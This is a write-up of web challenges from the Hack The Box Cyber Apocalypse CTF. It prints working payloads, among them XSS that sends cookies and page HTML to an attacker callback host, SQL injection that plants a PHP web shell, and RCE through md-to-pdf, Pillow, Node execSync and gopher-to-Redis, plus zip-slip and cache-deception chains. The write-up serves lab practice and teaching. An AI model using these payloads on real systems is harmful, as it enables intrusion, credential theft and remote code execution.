---
title: "[All Web] - Hackthebox Cyber Apocalypse"
tags:
  - CTF
  - Write-up
---
![](banner-cyber-apocalypse%201.png)
## Prologue

CTF Hackthebox Cyber Apocalypse is an international competition held every year by Hack The Box. This CTF Competition is using Jeopardy-style, which means every teams must find a flag in the given challenge. This competition lasts for six days.

## Write Up

### Kryptos Support (300 pts)

The value of this challenge is 300 points and +1000 players have solved this challenge.

![](kryptos-1.png)

We're given a website with an interface like this.

![](kryptos-2.png)

After doing an enumeration, we only found an input and button. When submitting the form, We have a unique response that could make use of this as a hint. We assume this is a generic _Client-Side Challenge_

![](kryptos-3.png)

To prove our assumption, We sent a Cross-Site Scripting payload.

```html
<script> 
fetch('ip_callback') 
</script>
```
After waiting for a few seconds, We obtained a callback from an unknown IP address with HeadlessChrome as the User-Agent. That means our assumption is correct.

![](kryptos-5.png)

```html
<script> 
fetch('ip_callback/q?=' + document.cookie) 
</script>
```

After using the cookies the page didn't get the flag nor redirect to the logged-in dashboard.

![](kryptos-6.png)

After that our attempt is to get the source code HTML that the bot has.

```html
<script> 
fetch('ip_callback/q?=' + encodeURI(document.body.outerHTML)) 
</script>
```

![](kryptos-7.png)

Decoded result
```html
<body>
        <nav class="nav-bar">
            <ul>
                <li>
                    <a href="/settings">Settings</a>
                </li>
            </ul>
        </nav>
        <nav class="logged-bar">
           <ul>
               <li>
                   logged in as (), <a href="/logout">logout</a>
               </li>
           </ul>
       </nav>
      <div class="container on">
         <div class="screen">
            <h3 class="title">
               Kryptos Vault Support tickets
            </h3>
            <div class="message-container">
                
                    <div class="ticket-card">
                        <div class="c1"><span>Submitted </span></div>
                        <div class="c2"><p>2022-05-18 17:39:15</p></div>
                        <div class="c1"><span>Message </span></div>
                        <div class="c2"><p><script> 
fetch('http://x.nyxmare.co:1234/q?='   encodeURI(document.body.outerHTML)) 
</script></p></div></div></div></div></div></body>
```

We could see the new endpoint `/settings`

We visited the new endpoint, using the stolen cookies. Apparently. It's a feature that we could change the password.

![](kryptos-8.png)

After analyzing the request we found out we could change the password for another user. So we just change the `uid` 100 to 1.

```
POST /api/users/update HTTP/1.1
Host: 134.209.178.167:30580
Content-Length: 30
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
DNT: 1
Content-Type: application/json
Accept: */*
Origin: http://134.209.178.167:30580
Referer: http://134.209.178.167:30580/settings
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,id;q=0.8
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI4OTUzNzV9.lvNoW_CXaivBSOKLbzEZOVOAsY_9yG0lZ_vfa7nU3lg
Connection: close

{"password":"123","uid":"1"}
```
![](kryptos-9.png)

after that, we just log in at `/login` and successfully obtain the **FLAG**

![](kryptos-10.png)

**HTB{x55_4nd_id0rs_ar3_fun!!}**

### BlinkerFluids (300 points)

The value of this challenge is 300 points and +800 players have solved this challenge.

![](blinker-1.png)

We're given a website with a feature for creating an invoice using markdown and exporting it to PDF.

![](blinker-2.png)

In this challenge, the author gives us a source code, we could make use of this for analyzing the source code.

At **package.json** there's a vulnerable _dependency_ to RCE

```
{
    "name": "blinker-fluids",
    "version": "1.0.0",
    "description": "",
    "main": "index.js",
    "scripts": {
        "start": "node index.js"
    },
    "keywords": [],
    "author": "rayhan0x01",
    "license": "ISC",
    "dependencies": {
        "express": "4.17.3",
        "md-to-pdf": "4.1.0",
        "nunjucks": "3.2.3",
        "sqlite-async": "1.1.3",
        "uuid": "8.3.2"
    },
    "devDependencies": {
        "nodemon": "^1.19.1"
    }
}
```

[https://github.com/simonhaenisch/md-to-pdf/issues/99](https://github.com/simonhaenisch/md-to-pdf/issues/99)

That issue already shows the payload, We could make use of that to implement it to this challenge.

We tweaked the payload little bit and we managed to get the **FLAG**

```markdown
---js
{
    css: `body::before { content: "${require('fs').readFileSync('/flag.txt').toString()}"; display: block }`,
}
---
```

![](blinker-3.png)

**HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}**


### Amidst Us (300 points)

The value of this challenge is 300 points and +500 players have solved this challenge.

![](amidst-1.png)

We're given a website with a feature for changing the color of the uploaded image.

![](amidst-2.png)

In this challenge, the author gives us a source code, We could make use of this for analyzing the source code.

Same with before, we checked out the _dependency_ first and find out the application uses an obsolete `Pillow` version. In this version, we could find an issue on GitHub.

[https://github.com/python-pillow/Pillow/pull/5923](https://github.com/python-pillow/Pillow/pull/5923)

And in the _source code_ `challenge/application/util.py#L:16`, the parameter coior is passed into `ImageMath.eval()` function.

```python
alpha = ImageMath.eval(
            f'''float(
                max(
                max(
                    max(
                    difference1(red_band, {color[0]}),
                    difference1(green_band, {color[1]})
                    ),
                    difference1(blue_band, {color[2]})
                ),
                max(
                    max(
                    difference2(red_band, {color[0]}),
                    difference2(green_band, {color[1]})
                    ),
                    difference2(blue_band, {color[2]})
                )
                )
            )''',
            difference1=lambda source, color: (source - color) / (255.0 - color),
            difference2=lambda source, color: (color - source) / color,
            red_band=img_bands[0],
            green_band=img_bands[1],
            blue_band=img_bands[2]
        )
```

So, we just copy pasting the payload and successfully obtained the **FLAG**

```
POST /api/alphafy HTTP/1.1
Host: 157.245.40.139:31815
Content-Length: 342
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
DNT: 1
Content-Type: application/json
Accept: */*
Origin: http://157.245.40.139:31815
Referer: http://157.245.40.139:31815/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,id;q=0.8
Connection: close

{"image":"iVBORw0KGgoAAAANSUhEUgAAAHkAAAAbCAIAAADXpLdPAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAWklEQVRoQ+3QoQ0AIQDAwOfXICHsPyUeT9WdrOyYa38k/jvwjNcdrzted7zueN3xuuN1x+uO1x2vO153vO543fG643XH647XHa87Xne87njd8brjdcfrjtedA4v8AI+wONVzAAAAAElFTkSuQmCC","background":["(lambda: __import__('os').system('cat /flag.txt > application/static/flag.txt'))()",71,71]}
```

![](amidst-3.png)

**HTB{i_slept_my_way_to_rce}**


### Intergalactic Post (300 points)

The value of this challenge is 300 points and +360 players have solved this challenge.

![](intergalactic-1.png)

We're given a website with a feature for subscribing to stuff.

![](intergalactic-2.png)

In this challenge, the author gives us a source code, We could make use of this for analyzing the source code.

After reading the _source code_, there's an odd way for executing SQL at `challenge/Database.php#L34:L37`.

```php
public function subscribeUser($ip_address, $email)
{
    return $this->db->exec("INSERT INTO subscribers (ip_address, email) VALUES('$ip_address', '$email')");
}
```

In the `subscribeUser` function, PHP will execute the SQL without sanitizing our input.

And also we could see in this piece of code `challenge/models/SubscriberModel.php#L10:L19`

```php
public function getSubscriberIP(){
    if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)){
        return  $_SERVER["HTTP_X_FORWARDED_FOR"];
    }else if (array_key_exists('REMOTE_ADDR', $_SERVER)) {
        return $_SERVER["REMOTE_ADDR"];
    }else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER)) {
        return $_SERVER["HTTP_CLIENT_IP"];
    }
    return '';
}
```
At the `getSubscriberIP` function, its attempts to get the client IP, We could spoof this using `X-Forwarded-For` since its prioritizes `HTTP_X_FORWARDED_FOR` first.

In the `SQLite` DBMS,  `SQL Injection` could escalated into Remote Code Execution.

```
POST /subscribe HTTP/1.1
Host: 178.62.73.26:30911
Content-Length: 24
Cache-Control: max-age=0
Origin: http://178.62.73.26:30911
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://178.62.73.26:30911/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,id;q=0.8
Connection: close
X-Forwarded-For: ','');ATTACH DATABASE '/www/x.php' AS lol;CREATE TABLE lol.pwn (dataz text);INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--

email=nyx%40nymare.world
```

![](intergalactic-3.png)

**HTB{inj3ct3d_th3_tru7h}**

### Mutation Lab (300 points)

The value of this challenge is 300 points & +300 players have solved this challenge.

![](mutation-1.png)

We're given a website with a feature for registration and login.

![](mutation-2.png)

In the _dashboard_ menu, We're given a feature that converts SVG into PNG.

After playing with the request, we could trigger the application to show an error message. With this information, we could find out what library is used by this application.

![](mutation-3.png)

The newest CVE for this library is a local file read. So, we just copy-pasting again with the payload.

[https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-1582785](https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-1582785)

```html
<svg-dummy></svg-dummy>
<iframe src="file:///etc/passwd" width="100%" height="1000px"></iframe>
<svg viewBox="0 0 240 80" height="1000" width="1000" xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="0" class="Rrrrr" id="demo">data</text>
</svg>

```

![](mutation-4.png)

![](mutation-5.png)

Since we couldn't find the flag file, we attempted to read the source code on this application.

According to the another NodeJS challenge, the usual source code is placed on `/app`

So, we just need to check the /app/index.js and find out it's using a `.env`.

![](mutation-6.png)

![](mutation-7.png)

After that, I am reading the `/app/routes/index.js`, We need to forge the cookie with `SECRET_KEY` on `.env` before so we could change the user into `admin`

![](mutation-8.png)

```javascript
const express = require('express')
const cookieParser = require('cookie-parser')
const session = require('cookie-session')

app = express()

app.use(cookieParser())
app.use(session({
    name:'session',
    keys:['5921719c3037662e94250307ec5ed1db']
}))

app.get('/', async (req, res)=>{
    try {
        req.session.username = 'admin'
        return res.send('nice');
    } catch (error) {
        console.log(error)
    }
})

app.listen(1111, ()=>{
    console.log('nice')
})
```

After forging the cookie we could use this cookie and check the dashboard, and We could successfully obtain the flag.

**HTB{fr4m3d_th3_s3cr37s_f0rg3d_th3_entrY}**

### Acnologia Portal (300 points)

The value of this challenge is 300 points & +180 players have solved this challenge.

![](acnologia-1.png)

We're given a website with a feature for registration and login.

![](acnologia-2.png)

In the _dashboard_ menu, We're given a feature that We could send something to the bot.

After doing some static analysis, there are a few things we need to pay attention to.

1. at `challenge/application/blueprints/routes.py#L76:L96` for every report we send, the bot will visit our report.

```python
@api.route('/firmware/report', methods=['POST'])
@login_required
def report_issue():
    if not request.is_json:
        return response('Missing required parameters!'), 401

    data = request.get_json()
    module_id = data.get('module_id', '')
    issue = data.get('issue', '')

    if not module_id or not issue:
        return response('Missing required parameters!'), 401

    new_report = Report(module_id=module_id, issue=issue, reported_by=current_user.username)
    db.session.add(new_report)
    db.session.commit()

    visit_report()
    migrate_db()

    return response('Issue reported successfully!')
```

2. at `challenge/application/templates/review.html#L20:L29` there's an XSS 

```html
<div class="container" style="margin-top: 20px"> {% for report in reports %} <div class="card">
        <div class="card-header"> Reported by : {{ report.reported_by }}
        </div>
        <div class="card-body">
        <p class="card-title">Module ID : {{ report.module_id }}</p>
          <p class="card-text">Issue : {{ report.issue | safe }} </p>
          <a href="#" class="btn btn-primary">Reply</a>
          <a href="#" class="btn btn-danger">Delete</a>
        </div>
      </div> {% endfor %} </div>
```

3. At `challenge/application/util.py#L17:L42` there's a `zip slip vulnerability in that function it will extract the archive without sanitizing the file name and checking is it a `symlink` file or not.

```python
def extract_firmware(file):
    tmp  = tempfile.gettempdir()
    path = os.path.join(tmp, file.filename)
    file.save(path)

    if tarfile.is_tarfile(path):
        tar = tarfile.open(path, 'r:gz')
        tar.extractall(tmp)

        rand_dir = generate(15)
        extractdir = f"{current_app.config['UPLOAD_FOLDER']}/{rand_dir}"
        os.makedirs(extractdir, exist_ok=True)
        for tarinfo in tar:
            name = tarinfo.name
            if tarinfo.isreg():
                try:
                    filename = f'{extractdir}/{name}'
                    os.rename(os.path.join(tmp, name), filename)
                    continue
                except:
                    pass
            os.makedirs(f'{extractdir}/{name}', exist_ok=True)
        tar.close()
        return True

    return False
```

It can be concluded,  We need to chain the bug from XSS to zip-slip for getting the flag.

Our first to-do is creating a malicious archive and symlinking the file /flag.

```python
import tarfile, os

if not os.path.exists('symlink'):
    os.symlink('/flag.txt', 'symlink')

path = "../app/application/static/js/flag"
tf = tarfile.open('exploit.tar.gz' , 'w:gz')
tf.add('symlink', path)
tf.close()
```

After that set up a webserver for getting the malicious archive before.

```javascript
(async() => {
    var url = "http://webserver__"
    var f = await fetch(`${url}/`)
    content = await f.blob();
    console.log(content)
    var formData = new FormData();
    formData.append('file', content)
    await fetch("/api/firmware/upload", { method: 'POST', body: formData }).then((r)=>r.text()).then((r)=>fetch('https://webserver_/?q='+encodeURI(r)));
})()
```

And also we need to add CORS for our webserver.

```php
<?php
header('Access-Control-Allow-Origin: http://localhost:1337');
echo file_get_contents('./exploit.tar.gz');
?>
```

After the preparation is done, we just put the XSS payload in the issue textbox.

```html
<script src="http://webserver/main.js"></script>
```

After waiting for a few seconds, we received a callback from our server. and we could access the `/static/js/flag` for getting the flag.

![](acnologia-5.png)

**HTB{des3r1aliz3_4ll_th3_th1ngs}**

### Spiky Tamagotchi (325 points)

The value of this challenge is 325 points & +90 players have solved this challenge.

![](spiky-1.png)

We're given a website for login only.

![](spiky-2.png)

After doing some static analysis and dynamic analysis there's something that needs to point out.

at `challenge/helpers/SpikyFactory.js#L2:L17` there's a `Code Injection` where our input will pass into `anonymous function`.

```javascript
const calculate = (activity, health, weight, happiness) => {
    return new Promise(async (resolve, reject) => {
        try {
            // devine formula :100:
            let res = `with(a='${activity}', hp=${health}, w=${weight}, hs=${happiness}) {
                if (a == 'feed') { hp += 1; w += 5; hs += 3; } if (a == 'play') { w -= 5; hp += 2; hs += 3; } if (a == 'sleep') { hp += 2; w += 3; hs += 3; } if ((a == 'feed' || a == 'sleep' ) && w > 70) { hp -= 10; hs -= 10; } else if ((a == 'feed' || a == 'sleep' ) && w < 40) { hp += 10; hs += 5; } else if (a == 'play' && w < 40) { hp -= 10; hs -= 10; } else if ( hs > 70 && (hp < 40 || w < 30)) { hs -= 10; }  if ( hs > 70 ) { m = 'kissy' } else if ( hs < 40 ) { m = 'cry' } else { m = 'awkward'; } if ( hs > 100) { hs = 100; } if ( hs < 5) { hs = 5; } if ( hp < 5) { hp = 5; } if ( hp > 100) { hp = 100; }  if (w < 10) { w = 10 } return {m, hp, w, hs}
                }`;
            quickMaths = new Function(res);
            const {m, hp, w, hs} = quickMaths();
            resolve({mood: m, health: hp, weight: w, happiness: hs})
        }
        catch (e) {
            reject(e);
        }
    });
}
```

Since the challenge author did not give any credentials or registration feature. We attempt to debug the challenge at `challenge/database.js`

```javascript
async loginUser(user, pass) {
    return new Promise(async (resolve, reject) => {
        let stmt = 'SELECT username FROM users WHERE username = ? AND password = ?';
        this.connection.query(stmt, [user, pass], (err, result) => {
            console.log(err)
            if(err || result.length == 0)
                reject(err)
            resolve(result)
        });
    });
}
```

After playing with the request, we found out the odd thing when we send an `object` at the `password` parameter.

![](spiky-3.png)

![](spiky-4.png)

key object at our input will be a table name and the value object will be the value.

If we send a JSON request like this, the SQL will be like this.

![](spiky-5.png)

Since we successfully logged in, the dashboard will look like this.

![](spiky-6.png)

At `challenge/routes/index.js#L32:L44` the function `calculate` will be called, and the `activity` parameter will not be sanitized, We could make use of this for `code injection`

```javascript
router.post('/api/activity', AuthMiddleware, async (req, res) => {
    const { activity, health, weight, happiness } = req.body;
    if (activity && health && weight && happiness) {
        return SpikyFactor.calculate(activity, parseInt(health), parseInt(weight), parseInt(happiness))
            .then(status => {
                return res.json(status);
            })
            .catch(e => {
                res.send(response('Something went wrong!'));
            });
    }
    return res.send(response('Missing required parameters!'));
});
```

We successfully obtained the flag.

```
POST /api/activity HTTP/1.1
Host: 165.227.224.55:31747
Content-Length: 151
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
DNT: 1
Content-Type: application/json
Accept: */*
Origin: http://165.227.224.55:31747
Referer: http://165.227.224.55:31747/interface
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,id;q=0.8
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjUyOTU0NzU1fQ.vldF7xPFUtbh1SgPY6RJ-nPl07ExbLScjw4ugOlc9dI
Connection: close

{"activity":"feed'+process.mainModule.require('child_process').execSync('cat /fl* > /app/static/flag')+'","health":"60","weight":"42","happiness":"50"}
```

![](spiky-7.png)

**HTB{3sc4p3d_bec0z_n0_typ3_ch3ck5}**

### Red Island (325 points)

The value of this challenge is 325 points & +90 players have solved this challenge.

![](red-1.png)

We're given a website for login and registration.

![](red-2.png)

In the dashboard, We could fetch an image from another URL

![](red-3.png)

In general, this kind of feature is vulnerable to `Local File Read` or `Server Side Request Forgery`.

![](red-4.png)

We attempted to find the flag file, so our next attempt is to read the source code instead.

![](red-5.png)

As we can see, there's a library involved with `Redis`. With chaining the known vulnerability, We assume it's an SSRF.

There's an article that explains how to access Redis service using gopher protocol. 

[https://maxchadwick.xyz/blog/ssrf-exploits-against-redis](https://maxchadwick.xyz/blog/ssrf-exploits-against-redis)

And we also there's a recent CVE involved with redis.

```
gopher://127.0.0.1:6379/_*3%0d%0a%244%0d%0aeval%0d%0a%24197%0d%0alocal%20io_l%20%3d%20package.loadlib(%22%2fusr%2flib%2fx86_64-linux-gnu%2fliblua5.1.so.0%22%2c%20%22luaopen_io%22)%3b%20local%20io%20%3d%20io_l()%3b%20local%20f%20%3d%20io.popen(%22cat%20%2froot%2fflag%22%2c%20%22r%22)%3b%20local%20res%20%3d%20f%3aread(%22*a%22)%3b%20f%3aclose()%3b%20return%20res%0d%0a%241%0d%0a0%0d%0a*1%0d%0a%244%0d%0aquit
```

![](red-6.png)

**HTB{r3d_righ7_h4nd_t0_th3_r3dis_land!}**

### Genesis Wallet (325 points)

The value of this challenge is 325 points & +110 players have solved this challenge.

![](genesis-1.png)

We're given a website for login and registration.

![](genesis-2.png)

In the dashboard, there's a feature where we could transfer a `Genesis Coin`.

After doing some static analysis, there's something that needs to point out.

At `challenge/routes/index.js#L165:L167`, We could see there's no sanitation about the negative number.

```javascript
if (parseFloat(user.balance) < parseFloat(amount)) return res.status(403).send(response('Insufficient Funds!'));
if (!addressExp.test(receiver)) return res.status(403).send(response('Invalid receiver address format!'));
if (receiver == user.address) return res.status(403).send(response(`You can't send to your own address!`));
```
We need to drain the `icarus` balance, so we need to know the address for the `icarus` account. Its explained at here `challenge/database.js#L50`

```javascript
let address = crypto.createHash('md5').update(user).digest("hex");
```

This means, that the address for `icarus` is the result of encryption of the username `icarus`.

```bash
└─$ echo -n "icarus" | md5sum           
1ea8b3ac0640e44c27b3cb8a258a87f8  -
```

![](genesis-3.png)


**HTB{fl3w_t00_cl0s3_t0_th3_d3cept10n}**

### Genesis Wallet's Revenge (350 points)

The value of this challenge is 350 points & +40 players have solved this challenge.

![](genesisr-1.png)

The source code for this challenge is the same as before, except the author is already put a check for a negative number when sending a coin.

We already know before, that the challenge is using varnish 6.1 as a cache application. In this version, it's vulnerable to `Request Smuggling`. We assume its impossible to escalate it to steal the balance `icarus`

And also, for every transaction request, it will trigger the bot for visiting the `/transactions` page, We assume it's another `client-side attack` since We could send an HTML payload to that page. Unfortunately, at `challenge/helpers/MDHelpers.js` our input is already sanitized by the newest version `DOMPurify`.

We tried to read the router in this application and find out there's something fishy about regex.

```javascript
router.get(/^\/(\w{2})?\/?(setup|reset)-2fa/, AuthMiddleware, async (req, res) => {
    let lang = req.params[0];
    if (!lang) lang = 'en';
    let otpkey = OTPHelper.genSecret();

    return db.setOTPKey(req.user.username, otpkey)
        .then(() => {
        return res.render(`${lang}/setup-2fa.html`, {otpkey: otpkey, action: req.params[1]});
        })
        .catch(err => {
            console.log(err);
            return res.status(500).send(response('Something went wrong!'));
        });
});
```
as we can see, the regex is lack the `end` regex. So we still could access those endpoints like this.

`/reset-2fa.js`,  `/reset-2fa.css`, etc.

And also, at varnish configuration, we could see the page is caching the URL if it's matched with a regex.

```
sub vcl_recv {
    # Only allow caching for GET and HEAD requests
    if (req.method != "GET" && req.method != "HEAD") {
        return (pass);
    }
    # get javascript and css from cache
    if (req.url ~ "(\.(js|css|map)$|\.(js|css)\?version|\.(js|css)\?t)") {
        return (hash);
    }
    # get images from cache
    if (req.url ~ "\.(svg|ico|jpg|jpeg|gif|png)$") {
        return (hash);
    }
    # get fonts from cache
    if (req.url ~ "\.(otf|ttf|woff|woff2)$") {
        return (hash);
    }
    # get everything else from the backend
    return(pass);
}
```

By making use of those regex misconfigurations, We could exploit it using `web cache deception`, Which means we could force the victim to caching the sensitive page.

We could make use of the note feature by sending an image tag with src `/reset-2fa`. This attack is feasible because the application is lack CSRF protection.

```
![a](/reset-2fa.js)
```

with this payload, the bot will GET requesting `/reset-2fa.js`, and since, it's a valid regex for varnish configuration, Varnish will caching this sensitive endpoint.

After sending the payload, and waiting for a few seconds for the bot to visit the page, we could access the `/reset-2fa.js` and need to change the header to `Host: 127.0.0.1`. This is because the bot is visiting `127.0.0.1` and varnish using host origin as the `cache partition` key.

![](genesisr-3.png)

We successfully obtained the 2FA, all We need to do is just drain all `icarus` balance to our user.

![](genesisr-4.png)

![](genesisr-5.png)

**HTB{Fl3w_t00_cl0s3_t0_7h3_d3cept10n_4nd_burn3d!}**


### Checkpointbots (350 points)

The value of this challenge is 350 points & +40 players have solved this challenge.

![](check-1.png)

We're given a website with a `check-in` stuff feature.

![](check-2.png)

After doing static analysis, this application uses vulnerable log4j.

For every wrong token, the application will log the token to log4j. This means this parameter is used for our exploit.

We're using `JNDIExploit-1.2.jar` for exploiting this challenge.

By default, at java spring webserver, `query string` with characters `$` and `{`, `}` is always rejected. We could bypass this using URL encoding.

![](check-3.png)

We're using `Deserialization` at `CommonBeanUtils1` for the gadget and we successfully obtained a `RCE`

![](check-4.png)

**HTB{l0g4j2_g4dg3t_ch4in_55t1_f0r_fun}**

## Epilogue

We successfully solved all web challenges in this competition. The given challenge is very interesting and fun. From XSS to Java Deserialization. _Kudos_ to the author of the challenge for giving us a fun challenge.


— nyxsorcerer
